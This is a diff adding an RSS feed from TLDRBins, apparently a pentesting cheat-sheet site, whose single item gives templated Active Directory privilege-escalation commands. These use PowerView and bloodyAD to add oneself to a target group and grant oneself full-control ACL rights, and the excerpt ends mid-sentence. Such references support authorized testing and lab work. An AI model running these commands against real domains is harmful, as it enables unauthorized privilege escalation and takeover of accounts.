@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Powerview on TLDRBins</title>
+    <link>https://tldrbins.github.io/@powerview/</link>
+    <description>Recent content in Powerview on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@powerview/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AddSelf</title>
+      <link>https://tldrbins.github.io/addself/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addself/</guid>
+      <description>Privesc #1: Add self to group (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+    </item>
+  </channel>
+</rss>
